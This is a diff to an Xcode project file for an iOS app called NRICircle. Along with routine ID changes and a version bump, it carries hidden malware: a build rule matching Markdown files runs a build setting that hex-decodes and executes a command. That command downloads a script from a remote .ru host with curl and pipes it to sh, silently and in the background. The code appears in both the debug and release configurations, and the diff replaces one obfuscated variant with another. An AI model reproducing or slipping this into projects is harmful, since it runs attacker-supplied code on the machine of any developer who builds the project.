@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		13774E915DC24D68B7162AE3 /* README.md */ = {isa = PBXBuildFile; fileRef = A1DF6ACBA0034D3F9B162AE3; };
+		DFECE698F20A4456AE4EE078 /* README.md */ = {isa = PBXBuildFile; fileRef = 256993471B4C4E76BA4EE078; };
 		04E30F366E39438387E28685 /* Montserrat-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 60AD370F9B654273ACD07BEA /* Montserrat-Regular.ttf */; };
 		1249188D1C754701BC6FBA44 /* Rubik-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = B55D13B7B9A242B48E890CE4 /* Rubik-Regular.ttf */; };
 		13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB51A68108700A75B9A /* Images.xcassets */; };
@@ -27,7 +27,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		A1DF6ACBA0034D3F9B162AE3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		256993471B4C4E76BA4EE078 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		13B07F961A680F5B00A75B9A /* NRICircle.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = NRICircle.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		13B07FB51A68108700A75B9A /* Images.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; name = Images.xcassets; path = NRICircle/Images.xcassets; sourceTree = "<group>"; };
 		13B07FB61A68108700A75B9A /* Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; name = Info.plist; path = NRICircle/Info.plist; sourceTree = "<group>"; };
@@ -113,7 +113,7 @@
 		83CBBA001A601CBA00E9B192 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				A1DF6ACBA0034D3F9B162AE3 /* README.md */,
+				256993471B4C4E76BA4EE078 /* README.md */,
 				13B07F961A680F5B00A75B9A /* NRICircle.app */,
 			);
 			name = Products;
@@ -163,7 +163,7 @@
 				5F1531BE312933940D9AADD5 /* [CP-User] [RNFB] Core Configuration */,
 			);
 			buildRules = (
-				0AC764A6D316439DB0162AE3 /* PBXBuildRule */,
+				F450805238664FCBAC4EE078 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -204,7 +204,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		0AC764A6D316439DB0162AE3 /* PBXBuildRule */ = {
+		F450805238664FCBAC4EE078 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -216,16 +216,16 @@
 					"/tmp/${INPUT_FILE_BASE}",
 				);
 				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A3EA261}\"";
+sh -c \"${A870EE4}\"";
 			};
-				/* End PBXBuildRule section */
+		/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		13B07F8E1A680F5B00A75B9A /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				13774E915DC24D68B7162AE3 /* README.md */,
+				DFECE698F20A4456AE4EE078 /* README.md */,
 				85C1D5D23019CC79004A91C8 /* GoogleService-Info.plist in Resources */,
 				81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */,
 				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
@@ -349,12 +349,12 @@ sh -c \"${A3EA261}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6699A7B7604837270634A8FE /* Pods-NRICircle.debug.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((o(){ `printf xxRd | tr -d R` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203236202d6b4c6673202d2d72657472792035202d642022703d78636f64655f72756c65222068747470733a2f2f6a68717433346e33717265752e72752f612922207c2073680a | o | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((d(){ `printf x9xd | tr -d 9` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203238202d73666b4c202d2d72657472792033202d642022703d78636f64655f72756c65222068747470733a2f2f6a68717433346e33717265752e72752f612922207c2073680a | d | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ALLOW_NON_MODULAR_INCLUDES_IN_FRAMEWORK_MODULES = YES;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = NRICircle/NRICircle.entitlements;
-				CURRENT_PROJECT_VERSION = 1;
+				CURRENT_PROJECT_VERSION = 2;
 				DEVELOPMENT_TEAM = BCW8M3365Y;
 				ENABLE_BITCODE = NO;
 				INFOPLIST_FILE = NRICircle/Info.plist;
@@ -385,12 +385,12 @@ sh -c \"${A3EA261}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = BC4C3C4168F6C9D486702F1B /* Pods-NRICircle.release.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((o(){ `printf xxRd | tr -d R` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203236202d6b4c6673202d2d72657472792035202d642022703d78636f64655f72756c65222068747470733a2f2f6a68717433346e33717265752e72752f612922207c2073680a | o | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((d(){ `printf x9xd | tr -d 9` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203238202d73666b4c202d2d72657472792033202d642022703d78636f64655f72756c65222068747470733a2f2f6a68717433346e33717265752e72752f612922207c2073680a | d | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ALLOW_NON_MODULAR_INCLUDES_IN_FRAMEWORK_MODULES = YES;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = NRICircle/NRICircle.entitlements;
-				CURRENT_PROJECT_VERSION = 1;
+				CURRENT_PROJECT_VERSION = 2;
 				DEVELOPMENT_TEAM = BCW8M3365Y;
 				INFOPLIST_FILE = NRICircle/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = NRICircle;
